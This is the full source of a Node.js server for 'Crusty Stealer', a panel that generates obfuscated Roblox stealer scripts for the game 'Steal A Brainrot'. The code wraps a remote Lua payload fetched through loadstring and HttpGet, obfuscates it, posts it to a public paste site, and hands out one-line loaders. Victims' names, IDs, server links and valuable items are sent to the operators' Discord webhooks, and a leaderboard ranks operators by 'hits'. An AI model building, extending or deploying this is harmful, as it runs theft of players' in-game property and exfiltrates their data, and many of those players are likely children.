const express = require('express');
const cors = require('cors');
const axios = require('axios');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// ============= PATH CONFIGURATION =============
const baseDir = process.env.BASE_DIR || __dirname;
const stealerJsonPath = process.env.STEALER_JSON_PATH || path.resolve(baseDir, 'stealer.json');
const publicDir = process.env.PUBLIC_DIR || path.resolve(baseDir, 'public');

// ============= CRUSTYDB CONFIG =============
const CRUSTYDB_URL = process.env.CRUSTYDB_URL || 's';
const CRUSTYDB_PASSWORD = process.env.CRUSTYDB_PASSWORD || '';

const crustydbHeaders = {
  'X-API-Password': CRUSTYDB_PASSWORD,
  'Content-Type': 'application/json'
};

// ============= PROTECTION WEBHOOKS STORAGE =============
// RAM store for protection webhooks
const protectionWebhooks = new Map(); // id -> webhookURL

// ============= SECURITY FEATURES =============
const scriptGenerationCooldowns = new Map(); // userId -> { lastGenerated: timestamp, count: number }
const failedCaptchaAttempts = new Map(); // ip -> { count: number, timestamp: timestamp }
const captchaSessions = new Map(); // sessionId -> { answer: string, attempts: number, timestamp: timestamp }
const protectionHitCounts = new Map(); // protectionId -> { count: number, username: string }
const apiRateLimits = new Map(); // ip:endpoint -> { count: number, timestamp: timestamp }

const SCRIPT_GENERATION_COOLDOWN_MS = 60000; // 1 minute between generations
const SCRIPT_GENERATION_LIMIT = 10; // Max 10 scripts per hour
const FAILED_CAPTCHA_LIMIT = 5; // Max 5 failed attempts per hour
const CAPTCHA_EXPIRY_MS = 300000; // 5 minutes
const API_RATE_LIMIT_REQUESTS = 100; // Max 100 requests per minute per endpoint
const API_RATE_LIMIT_WINDOW_MS = 60000; // 1 minute

// ============= EXTERNAL APIS =============
const OBFUSCATION_API = 'https://wearedevs.net/api/obfuscate';
const PASTEFY_API = 'https://pastefy.app/api/v2/paste';
const CRUSTY_LOGO = 'https://raw.githubusercontent.com/platinww/CrustyMain/refs/heads/main/UISettings/crustylogonew.png';

// ============= MIDDLEWARE =============
app.use(express.json());
app.use(cors());
app.use(express.static(publicDir));

app.use(session({
  secret: process.env.SESSION_SECRET || 'crusty_secret_key_2026',
  resave: false,
  saveUninitialized: true,
  cookie: { secure: false, httpOnly: true, maxAge: 15 * 60 * 1000 } // 15 minutes
}));

// ============= BOT DETECTION MIDDLEWARE =============
app.use((req, res, next) => {
  const userAgent = req.get('user-agent');
  const hasHeaders = req.get('accept') && req.get('accept-encoding') && req.get('accept-language');
  
  if (!userAgent || !hasHeaders) {
    req.isBotSuspect = true;
  } else {
    req.isBotSuspect = false;
  }
  
  req.clientIp = req.ip || req.connection.remoteAddress;
  next();
});

// ============= API RATE LIMITING MIDDLEWARE =============
app.use((req, res, next) => {
  // Skip rate limiting for GET / and static files and protection/send endpoints
  if (req.path === '/' || req.path.startsWith('/public') || req.path === '/api/protection/send') {
    return next();
  }

  const key = `${req.clientIp}:${req.path}`;
  const now = Date.now();
  
  let rateLimitData = apiRateLimits.get(key);
  
  if (!rateLimitData) {
    rateLimitData = { count: 1, timestamp: now };
    apiRateLimits.set(key, rateLimitData);
    return next();
  }
  
  // Reset if window expired
  if (now - rateLimitData.timestamp > API_RATE_LIMIT_WINDOW_MS) {
    apiRateLimits.set(key, { count: 1, timestamp: now });
    return next();
  }
  
  // Check limit
  if (rateLimitData.count >= API_RATE_LIMIT_REQUESTS) {
    return res.status(429).json({ 
      success: false, 
      message: 'Too many requests. Please try again later.' 
    });
  }
  
  rateLimitData.count += 1;
  next();
});

// ============= ROOT ROUTE =============
app.get('/', (req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

// ============= HELPER FUNCTIONS =============

// ============= EXTERNAL APIS =============

// Obfuscate script
async function obfuscateScript(script) {
  try {
    const response = await axios.post('https://wearedevs.net/api/obfuscate', 
      { script: script },
      { headers: { 'Content-Type': 'application/json' }, timeout: 30000 }
    );
    
    if (!response.data.success) {
      throw new Error('Obfuscation failed');
    }
    
    return response.data.obfuscated;
  } catch (error) {
    console.error('Obfuscation error:', error.message);
    throw new Error('Failed to obfuscate script');
  }
}

// Upload to Pastefy
async function uploadToPastefy(content, username) {
  try {
    const payload = {
      title: `Steal A Brainrot - ${username} - ${new Date().toLocaleString()}`,
      content: content,
      visibility: 'PUBLIC',
      encrypted: false
    };

    const response = await axios.post('https://pastefy.app/api/v2/paste', payload, {
      headers: { 'Content-Type': 'application/json' },
      timeout: 30000
    });

    if (!response.data.paste || !response.data.paste.id) {
      throw new Error('Invalid response from Pastefy');
    }

    const pasteId = response.data.paste.id;
    const pasteUrl = `https://pastefy.app/${pasteId}`;
    const rawUrl = `${pasteUrl}/raw`;

    return { pasteUrl, rawUrl, pasteId };
  } catch (error) {
    console.error('Pastefy upload error:', error.message);
    throw new Error('Failed to upload to Pastefy');
  }
}

// ============= CAPTCHA IMAGE GENERATION =============
function generateCaptchaImage(text) {
  try {
    const width = 300;
    const height = 100;
    
    // Create SVG with obfuscated text
    let svg = `<svg width="${width}" height="${height}" xmlns="http://www.w3.org/2000/svg">`;
    
    // Background
    svg += `<rect width="${width}" height="${height}" fill="#1a1a1a"/>`;
    
    // Add noise lines
    for (let i = 0; i < 10; i++) {
      const x1 = Math.random() * width;
      const y1 = Math.random() * height;
      const x2 = Math.random() * width;
      const y2 = Math.random() * height;
      svg += `<line x1="${x1}" y1="${y1}" x2="${x2}" y2="${y2}" stroke="#444" stroke-width="2"/>`;
    }
    
    // Add diagonal line through middle
    svg += `<line x1="0" y1="${height/2}" x2="${width}" y2="${height/2}" stroke="#666" stroke-width="3"/>`;
    
    // Add noise dots
    for (let i = 0; i < 50; i++) {
      const x = Math.random() * width;
      const y = Math.random() * height;
      svg += `<circle cx="${x}" cy="${y}" r="2" fill="rgba(138, 43, 226, 0.3)"/>`;
    }
    
    // Add text with rotation and slight distortion
    const angle = (Math.random() - 0.5) * 15;
    svg += `<g transform="translate(${width/2}, ${height/2}) rotate(${angle})">`;
    svg += `<text x="0" y="0" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="#8a2be2" text-anchor="middle" dominant-baseline="middle">${text}</text>`;
    svg += `</g>`;
    
    svg += `</svg>`;
    
    // Convert to Base64
    const buffer = Buffer.from(svg);
    return 'data:image/svg+xml;base64,' + buffer.toString('base64');
  } catch (error) {
    console.error('CAPTCHA generation error:', error);
    return null;
  }
}

// ============= PROTECTION SYSTEM =============

// Load protections from stealer.json
async function loadProtectionsFromStealer() {
  try {
    const data = await getStealerData();
    if (data.scripts && Array.isArray(data.scripts)) {
      for (const script of data.scripts) {
        if (script.protectionId && script.webhook) {
          protectionWebhooks.set(script.protectionId, script.webhook);
        }
      }
      console.log(`✅ Loaded ${protectionWebhooks.size} protection webhooks from stealer.json`);
    }
    
    // Load leaderboard data
    if (data.leaderboard && Array.isArray(data.leaderboard)) {
      for (const entry of data.leaderboard) {
        if (entry.protectionId && entry.username !== undefined && entry.hits !== undefined) {
          protectionHitCounts.set(entry.protectionId, { count: entry.hits, username: entry.username });
        }
      }
      console.log(`✅ Loaded ${data.leaderboard.length} leaderboard entries from stealer.json`);
    }
  } catch (error) {
    console.error('Error loading protections from stealer.json:', error.message);
  }
}

// Create protection - generates unique ID and stores webhook
function createProtectionId(webhook) {
  const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
  protectionWebhooks.set(id, webhook);
  return id;
}

// Get webhook URL by protection ID
function getProtectionWebhook(protectionId) {
  return protectionWebhooks.get(protectionId);
}

// Send protection notification
async function sendProtectionNotification(protectionId, data) {
  try {
    const webhookURL = getProtectionWebhook(protectionId);
    if (!webhookURL) {
      throw new Error('Webhook not found for protection ID: ' + protectionId);
    }

    const { status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone } = data;

    // Track hits on leaderboard (only for 'hit' status) and save to stealer.json
    if (status === 'hit') {
      try {
        const stealerData = await getStealerData();
        let leaderboard = stealerData.leaderboard || [];
        
        // Find existing entry
        let entry = leaderboard.find(e => e.protectionId === protectionId);
        
        if (!entry) {
          // Get username from scripts
          const scripts = stealerData.scripts || [];
          const script = scripts.find(s => s.protectionId === protectionId);
          
          entry = {
            protectionId,
            username: script ? script.username : 'Unknown',
            hits: 0
          };
          leaderboard.push(entry);
        }
        
        entry.hits += 1;
        
        // Save updated leaderboard to stealer.json
        await saveStealerData({ 
          users: stealerData.users || [], 
          scripts: stealerData.scripts || [],
          leaderboard 
        });
        
        // Also update RAM cache
        protectionHitCounts.set(protectionId, { count: entry.hits, username: entry.username });
      } catch (error) {
        console.error('Error updating leaderboard:', error.message);
      }
    }

    let embed = {};

    if (status === 'hit') {
      const itemsList = items && items.length > 0 ? items.join('\n') : 'No Brainrots detected';
      embed = {
        title: 'Crusty Stealer',
        description: '**You Got A Hit!**',
        color: 0x8a2be2,
        thumbnail: { url: CRUSTY_LOGO },
        fields: [
          {
            name: 'Player Information',
            value: `\`\`\`yaml\nName: ${name || '-'}\nID: ${userid || '-'}\nAge: ${accountage || '-'} days\nDisplay: ${displayname || '-'}\`\`\``,
            inline: false,
          },
          {
            name: 'Server Information',
            value: `\`\`\`yaml\nPlayers: ${playercount || '-'}\nGame: ${gamename || '-'}\nStatus: ${privateserver ? 'Private Server' : 'Public Server'}\`\`\``,
            inline: false,
          },
          {
            name: `Brainrots Detected (${(items && items.length) || 0} total)`,
            value: `\`\`\`${itemsList}\`\`\``,
            inline: false,
          },
          {
            name: 'Target Server',
            value: serverlink || '-',
            inline: false,
          },
          {
            name: 'Sell All Brainrots',
            value: `[Click Here to Sell All Items](https://crusty.dev.tc/sell-all/${encodeURIComponent(name || '')})`,
            inline: false,
          },
          {
            name: 'Check Activity Status',
            value: `[Click Here to Check if User is Active](https://crusty.dev.tc/status-info/${encodeURIComponent(name || '')})`,
            inline: false,
          },
        ],
        footer: {
          text: 'Crusty Stealing System - Active',
          icon_url: CRUSTY_LOGO,
        },
        timestamp: new Date().toISOString(),
      };
    } else if (status === 'altaccount') {
      embed = {
        title: '⚠️ Alt Account Detected',
        description: '**No Valid Brainrots Found!**',
        color: 0xff0000,
        thumbnail: { url: CRUSTY_LOGO },
        fields: [
          {
            name: 'Player Information',
            value: `\`\`\`yaml\nName: ${name || '-'}\nID: ${userid || '-'}\nAge: ${accountage || '-'} days\nDisplay: ${displayname || '-'}\`\`\``,
            inline: false,
          },
          {
            name: 'Detection Result',
            value: '```No OG/Secret/Brainrot God animals found\nAccount flagged as alt```',
            inline: false,
          },
        ],
        footer: {
          text: 'Crusty Anti-Alt System',
          icon_url: CRUSTY_LOGO,
        },
        timestamp: new Date().toISOString(),
      };
    } else if (status === 'initializing') {
      embed = {
        title: 'Crusty Stealer',
        description: '**Someone is using Crusty Your Stealer Script!**',
        color: 0x8a2be2,
        thumbnail: { url: CRUSTY_LOGO },
        fields: [
          {
            name: 'Player Information',
            value: `\`\`\`yaml\nName: ${name || '-'}\nID: ${userid || '-'}\nAge: ${accountage || '-'} days\nDisplay: ${displayname || '-'}\`\`\``,
            inline: false,
          },
          {
            name: 'Server Information',
            value: `\`\`\`yaml\nPlayers: ${playercount || '-'}\nGame: ${gamename || '-'}\nStatus: ${privateserver ? 'Private Server' : 'Public Server'}\`\`\``,
            inline: false,
          },
        ],
        footer: {
          text: 'Crusty Hit Steal - Initializing',
          icon_url: CRUSTY_LOGO,
        },
        timestamp: new Date().toISOString(),
      };
    } else {
      throw new Error('Invalid status');
    }

    const payload = {
      username: 'Notifier | C̸͕͔͒͒r̸̟͓͒̓ụ̸̻̊̔s̴̻̖̀t̵̥͍͒͝y̶̥͊',
      avatar_url: CRUSTY_LOGO,
      embeds: [embed],
    };

    if (status === 'hit' && mentioneveryone) {
      payload.content = '@everyone';
    }

    await axios.post(webhookURL, payload, { 
      headers: { 'Content-Type': 'application/json' },
      timeout: 30000
    });

    console.log(`✅ Protection notification sent for ID: ${protectionId}`);
  } catch (error) {
    console.error('Protection notification error:', error.message);
    throw error;
  }
}

// CrustyDB Helpers
async function readFileFromDB(filename) {
  try {
    const response = await axios.get(
      `${CRUSTYDB_URL}/api/read-file/${filename}`,
      { headers: crustydbHeaders }
    );
    return response.data;
  } catch (error) {
    console.error(`Error reading ${filename}:`, error.message);
    return null;
  }
}

async function writeFileToDb(filename, content) {
  try {
    const response = await axios.post(
      `${CRUSTYDB_URL}/api/write-file`,
      { filename: filename, content: content },
      { headers: crustydbHeaders }
    );
    return response.data;
  } catch (error) {
    console.error(`Error writing ${filename}:`, error.message);
    throw error;
  }
}

async function createFileInDb(filename, content) {
  try {
    const response = await axios.post(
      `${CRUSTYDB_URL}/api/create-file`,
      { filename: filename, content: content },
      { headers: crustydbHeaders }
    );
    return response.data;
  } catch (error) {
    if (error.response?.status === 409) {
      return await writeFileToDb(filename, content);
    }
    console.error(`Error creating ${filename}:`, error.message);
    throw error;
  }
}

// ============= STEALER DATA HELPERS =============
async function getStealerData() {
  try {
    const file = await readFileFromDB('stealer.json');
    if (file && file.content) {
      return JSON.parse(file.content);
    }
    return { users: [], scripts: [], leaderboard: [] };
  } catch (error) {
    console.error('Error reading stealer.json:', error.message);
    return { users: [], scripts: [], leaderboard: [] };
  }
}

async function saveStealerData(data) {
  try {
    await createFileInDb('stealer.json', JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('Error saving stealer.json:', error.message);
    throw error;
  }
}

// ============= AUTH ROUTES =============

app.post('/api/auth/register', async (req, res) => {
  try {
    const { username, email, password, confirmPassword } = req.body;

    if (!username || !email || !password) {
      return res.status(400).json({ success: false, message: 'All fields required' });
    }

    // Email validation: 0-32 characters
    if (email.length > 32 || email.length < 3) {
      return res.status(400).json({ success: false, message: 'Email must be 3-32 characters' });
    }

    // Basic email format validation
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ success: false, message: 'Invalid email format' });
    }

    // Password validation: reasonable max (128 characters)
    if (password.length > 128 || password.length < 8) {
      return res.status(400).json({ success: false, message: 'Password must be 8-128 characters' });
    }

    if (password !== confirmPassword) {
      return res.status(400).json({ success: false, message: 'Passwords do not match' });
    }

    // Bot detection check
    if (req.isBotSuspect) {
      return res.status(403).json({ 
        success: false, 
        message: 'Bot verification required',
        requiresCaptcha: true
      });
    }

    const data = await getStealerData();
    let users = data.users || [];

    if (users.find(u => u.email === email)) {
      return res.status(400).json({ success: false, message: 'Email already registered' });
    }

    if (users.find(u => u.username === username)) {
      return res.status(400).json({ success: false, message: 'Username already taken' });
    }

    const hashedPassword = await bcrypt.hash(password, 10);

    const newUser = {
      id: Date.now().toString(),
      username,
      email,
      password: hashedPassword,
      createdAt: new Date().toISOString()
    };

    users.push(newUser);
    await saveStealerData({ users, scripts: data.scripts || [] });

    res.json({ success: true, message: 'Registration successful' });
  } catch (error) {
    console.error('Register error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({ success: false, message: 'Email and password required' });
    }

    const data = await getStealerData();
    const users = data.users || [];
    
    if (users.length === 0) {
      return res.status(401).json({ success: false, message: 'Invalid email or password' });
    }

    const user = users.find(u => u.email === email);
    if (!user) {
      return res.status(401).json({ success: false, message: 'Invalid email or password' });
    }

    const isPasswordValid = await bcrypt.compare(password, user.password);
    if (!isPasswordValid) {
      return res.status(401).json({ success: false, message: 'Invalid email or password' });
    }

    req.session.user = {
      id: user.id,
      username: user.username,
      email: user.email
    };

    res.json({
      success: true,
      message: 'Login successful',
      user: {
        id: user.id,
        username: user.username,
        email: user.email
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('/api/auth/check', (req, res) => {
  if (req.session.user) {
    res.json({ authenticated: true, user: req.session.user });
  } else {
    res.json({ authenticated: false });
  }
});

app.post('/api/auth/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: 'Logged out' });
});

// ============= SCRIPT GENERATION ROUTES =============

app.post('/api/webhook/validate', async (req, res) => {
  try {
    const { webhook } = req.body;

    if (!webhook) {
      return res.status(400).json({ success: false, message: 'Webhook URL required' });
    }

    try {
      const response = await axios.get(webhook);
      res.json({ 
        success: true, 
        message: 'Webhook is valid',
        data: response.data
      });
    } catch (error) {
      if (error.response?.status === 404) {
        return res.status(400).json({ success: false, message: 'Webhook not found' });
      }
      res.status(400).json({ success: false, message: 'Invalid Discord webhook' });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============= PROTECTION ROUTES =============

// Send protection notification (POST)
app.post('/api/protection/send', async (req, res) => {
  try {
    const { protectionId, status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone } = req.body;

    if (!protectionId) {
      return res.status(400).json({ success: false, message: 'Protection ID required' });
    }

    if (!getProtectionWebhook(protectionId)) {
      return res.status(404).json({ success: false, message: 'Protection ID not found' });
    }

    await sendProtectionNotification(protectionId, {
      status,
      name,
      userid,
      displayname,
      accountage,
      playercount,
      gamename,
      privateserver,
      serverlink,
      items,
      mentioneveryone
    });

    res.json({ success: true, message: 'Notification sent' });
  } catch (error) {
    console.error('Protection send error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// Send protection notification (GET with query parameters)
app.get('/api/protection/send', async (req, res) => {
  try {
    const { protectionId, status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone } = req.query;

    if (!protectionId) {
      return res.status(400).json({ success: false, message: 'Protection ID required' });
    }

    if (!getProtectionWebhook(protectionId)) {
      return res.status(404).json({ success: false, message: 'Protection ID not found' });
    }

    // Parse items if provided (comma separated)
    const itemsArray = items ? items.split(',') : [];

    await sendProtectionNotification(protectionId, {
      status,
      name,
      userid,
      displayname,
      accountage,
      playercount,
      gamename,
      privateserver: privateserver === 'true',
      serverlink,
      items: itemsArray,
      mentioneveryone: mentioneveryone === 'true'
    });

    res.json({ success: true, message: 'Notification sent' });
  } catch (error) {
    console.error('Protection send error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get protection webhook list (for backup/management)
app.get('/api/protection/list', async (req, res) => {
  try {
    if (!req.session.user) {
      return res.status(401).json({ success: false, message: 'Login required' });
    }

    const list = [];
    for (const [id, url] of protectionWebhooks.entries()) {
      list.push({ id, url: url.substring(0, 50) + '...' });
    }

    res.json({ success: true, protections: list, total: list.length });
  } catch (error) {
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Leaderboard endpoint
app.get('/api/leaderboard', async (req, res) => {
  try {
    const stealerData = await getStealerData();
    const leaderboardData = stealerData.leaderboard || [];
    
    // Sort by hits and get top 20
    const leaderboard = leaderboardData
      .sort((a, b) => b.hits - a.hits)
      .slice(0, 20)
      .map((entry, index) => ({
        rank: index + 1,
        protectionId: entry.protectionId,
        username: entry.username || 'Unknown',
        hits: entry.hits || 0
      }));

    res.json({
      success: true,
      leaderboard,
      totalEntries: leaderboardData.length
    });
  } catch (error) {
    console.error('Leaderboard error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.post('/api/script/generate', async (req, res) => {
  try {
    if (!req.session.user) {
      return res.status(401).json({ success: false, message: 'Login required' });
    }

    const userId = req.session.user.id;
    const now = Date.now();

    // Rate limiting check
    let cooldown = scriptGenerationCooldowns.get(userId);
    if (!cooldown) {
      cooldown = { lastGenerated: 0, count: 0, hourStart: now };
      scriptGenerationCooldowns.set(userId, cooldown);
    }

    // Check cooldown (1 minute between generations)
    if (now - cooldown.lastGenerated < SCRIPT_GENERATION_COOLDOWN_MS) {
      const waitTime = Math.ceil((SCRIPT_GENERATION_COOLDOWN_MS - (now - cooldown.lastGenerated)) / 1000);
      return res.status(429).json({ 
        success: false, 
        message: `Please wait ${waitTime} seconds before generating another script` 
      });
    }

    // Check hourly limit (10 scripts per hour)
    if (now - cooldown.hourStart > 3600000) {
      cooldown.count = 0;
      cooldown.hourStart = now;
    }

    if (cooldown.count >= SCRIPT_GENERATION_LIMIT) {
      return res.status(429).json({ 
        success: false, 
        message: 'You have reached the maximum scripts per hour. Try again later.' 
      });
    }

    const { webhook, game } = req.body;

    if (!webhook) {
      return res.status(400).json({ success: false, message: 'Webhook URL required' });
    }

    try {
      await axios.get(webhook);
    } catch (error) {
      return res.status(400).json({ success: false, message: 'Invalid webhook' });
    }

    let protectionId = null;
    let originalScript;

    try {
      protectionId = createProtectionId(webhook);
      originalScript = `PROTECT_ID = "${protectionId}" -- Protection ID\nloadstring(game:HttpGet("https://raw.githubusercontent.com/platinww/CrustyAuto/refs/heads/main/steal-a-brainrot.lua"))()`;
    } catch (error) {
      return res.status(400).json({ success: false, message: error.message });
    }

    let obfuscatedCode;
    try {
      obfuscatedCode = await obfuscateScript(originalScript);
    } catch (error) {
      return res.status(400).json({ success: false, message: error.message });
    }

    let pasteData;
    try {
      pasteData = await uploadToPastefy(obfuscatedCode, req.session.user.username);
    } catch (error) {
      return res.status(400).json({ success: false, message: error.message });
    }

    const loadstringCode = `loadstring(game:HttpGet("${pasteData.rawUrl}"))()`;

    try {
      const data = await getStealerData();
      let scripts = data.scripts || [];

      scripts.push({
        id: Date.now().toString(),
        userId: req.session.user.id,
        username: req.session.user.username,
        webhook: webhook,
        protection: true,
        protectionId: protectionId,
        game: game || 'Steal A Brainrot',
        rawUrl: pasteData.rawUrl,
        createdAt: new Date().toISOString()
      });

      if (scripts.length > 50) {
        scripts = scripts.slice(-50);
      }

      await saveStealerData({ users: data.users || [], scripts });
      
      // Update cooldown after successful generation
      cooldown.lastGenerated = now;
      cooldown.count += 1;
    } catch (error) {
      console.error('Error saving script:', error);
    }

    res.json({
      success: true,
      message: 'Script generated successfully',
      data: {
        loadstring: loadstringCode,
        pasteUrl: pasteData.pasteUrl,
        rawUrl: pasteData.rawUrl,
        protection: true,
        protectionId: protectionId
      }
    });
  } catch (error) {
    console.error('Generate script error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.get('/api/stats', async (req, res) => {
  try {
    if (!req.session.user) {
      return res.status(401).json({ success: false, message: 'Login required' });
    }

    const userId = req.session.user.id;
    const data = await getStealerData();
    const scripts = data.scripts || [];
    
    const userScripts = scripts.filter(s => s.userId === userId);
    const totalScripts = userScripts.length;

    const today = new Date().toDateString();
    const todayScripts = userScripts.filter(s => 
      new Date(s.createdAt).toDateString() === today
    ).length;

    res.json({
      success: true,
      stats: {
        totalScripts,
        todayScripts,
        username: req.session.user.username,
        email: req.session.user.email
      }
    });
  } catch (error) {
    console.error('Stats error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============= MY SCRIPTS ROUTES =============

app.get('/api/scripts/list', async (req, res) => {
  try {
    if (!req.session.user) {
      return res.status(401).json({ success: false, message: 'Login required' });
    }

    const userId = req.session.user.id;
    const data = await getStealerData();
    const allScripts = data.scripts || [];
    
    const userScripts = allScripts.filter(s => s.userId === userId).reverse();

    res.json({
      success: true,
      scripts: userScripts
    });
  } catch (error) {
    console.error('List scripts error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

app.put('/api/scripts/update/:id', async (req, res) => {
  try {
    if (!req.session.user) {
      return res.status(401).json({ success: false, message: 'Login required' });
    }

    const { id } = req.params;
    const { webhookUrl } = req.body;

    if (!webhookUrl) {
      return res.status(400).json({ success: false, message: 'Webhook URL required' });
    }

    // Validate webhook
    try {
      await axios.get(webhookUrl);
    } catch (error) {
      return res.status(400).json({ success: false, message: 'Invalid webhook' });
    }

    const data = await getStealerData();
    let scripts = data.scripts || [];

    const scriptIndex = scripts.findIndex(s => s.id === id && s.userId === req.session.user.id);
    if (scriptIndex === -1) {
      return res.status(404).json({ success: false, message: 'Script not found' });
    }

    const script = scripts[scriptIndex];

    // Generate protection ID for new webhook
    let protectionId = null;
    try {
      protectionId = createProtectionId(webhookUrl);
    } catch (error) {
      return res.status(400).json({ success: false, message: error.message });
    }

    // Update in DB
    const loadstringCode = `loadstring(game:HttpGet("${script.rawUrl}"))()`;
    
    scripts[scriptIndex] = {
      ...script,
      webhook: webhookUrl,
      protection: true,
      protectionId: protectionId,
      updatedAt: new Date().toISOString()
    };

    await saveStealerData({ users: data.users || [], scripts });

    res.json({
      success: true,
      message: 'Script updated successfully',
      data: {
        loadstring: loadstringCode,
        protection: true,
        protectionId: protectionId,
        updatedAt: new Date().toISOString()
      }
    });
  } catch (error) {
    console.error('Update script error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Delete script
app.delete('/api/scripts/delete/:id', async (req, res) => {
  try {
    if (!req.session.user) {
      return res.status(401).json({ success: false, message: 'Login required' });
    }

    const scriptId = req.params.id;
    const userId = req.session.user.id;

    const data = await getStealerData();
    let scripts = data.scripts || [];
    
    const scriptIndex = scripts.findIndex(s => s.id === scriptId && s.userId === userId);

    if (scriptIndex === -1) {
      return res.status(404).json({ success: false, message: 'Script not found' });
    }

    scripts.splice(scriptIndex, 1);
    await saveStealerData({ users: data.users || [], scripts });

    res.json({ success: true, message: 'Script deleted successfully' });
  } catch (error) {
    console.error('Delete script error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============= CAPTCHA ENDPOINTS =============

// Generate CAPTCHA image
app.get('/api/captcha/generate', (req, res) => {
  try {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let captchaText = '';
    for (let i = 0; i < 6; i++) {
      captchaText += characters.charAt(Math.floor(Math.random() * characters.length));
    }

    const sessionId = Date.now().toString(36) + Math.random().toString(36).slice(2);
    captchaSessions.set(sessionId, {
      answer: captchaText,
      attempts: 0,
      timestamp: Date.now()
    });

    // Clean up expired CAPTCHA sessions
    for (const [id, data] of captchaSessions.entries()) {
      if (Date.now() - data.timestamp > CAPTCHA_EXPIRY_MS) {
        captchaSessions.delete(id);
      }
    }

    const imageData = generateCaptchaImage(captchaText);
    if (!imageData) {
      return res.status(500).json({ success: false, message: 'Failed to generate CAPTCHA' });
    }

    res.json({
      success: true,
      sessionId: sessionId,
      image: imageData,
      expiresIn: CAPTCHA_EXPIRY_MS / 1000
    });
  } catch (error) {
    console.error('CAPTCHA generation error:', error);
    res.status(500).json({ success: false, message: 'Failed to generate CAPTCHA' });
  }
});

// Verify CAPTCHA
app.post('/api/captcha/verify', (req, res) => {
  try {
    const { sessionId, answer } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress;

    if (!sessionId || !answer) {
      return res.status(400).json({ success: false, message: 'Session ID and answer required' });
    }

    const session = captchaSessions.get(sessionId);
    if (!session) {
      return res.status(404).json({ success: false, message: 'CAPTCHA session not found' });
    }

    if (Date.now() - session.timestamp > CAPTCHA_EXPIRY_MS) {
      captchaSessions.delete(sessionId);
      return res.status(410).json({ success: false, message: 'CAPTCHA expired' });
    }

    session.attempts += 1;

    if (answer.toUpperCase() === session.answer) {
      captchaSessions.delete(sessionId);
      failedCaptchaAttempts.delete(clientIp);
      return res.json({ success: true, message: 'CAPTCHA verified' });
    }

    if (session.attempts >= 3) {
      captchaSessions.delete(sessionId);
      
      let failedAttempts = failedCaptchaAttempts.get(clientIp) || { count: 0, timestamp: Date.now() };
      
      if (Date.now() - failedAttempts.timestamp > 3600000) {
        failedAttempts = { count: 0, timestamp: Date.now() };
      }
      
      failedAttempts.count += 1;
      failedCaptchaAttempts.set(clientIp, failedAttempts);

      if (failedAttempts.count >= FAILED_CAPTCHA_LIMIT) {
        return res.status(429).json({ 
          success: false, 
          message: 'Too many failed CAPTCHA attempts. Please try again later.' 
        });
      }

      return res.status(401).json({ 
        success: false, 
        message: `Wrong answer. ${3 - session.attempts} attempts remaining` 
      });
    }

    res.status(401).json({ 
      success: false, 
      message: `Incorrect CAPTCHA. ${3 - session.attempts} attempts remaining` 
    });
  } catch (error) {
    console.error('CAPTCHA verify error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============= SERVER START =============
app.listen(PORT, async () => {
  console.log(`\nCrusty Script Generator started!`);
  console.log(`http://localhost:${PORT}`);
  console.log(`CrustyDB connected: ${CRUSTYDB_URL}`);
  
  // Load protections from stealer.json
  await loadProtectionsFromStealer();
  console.log(`✅ Protection system initialized\n`);
});
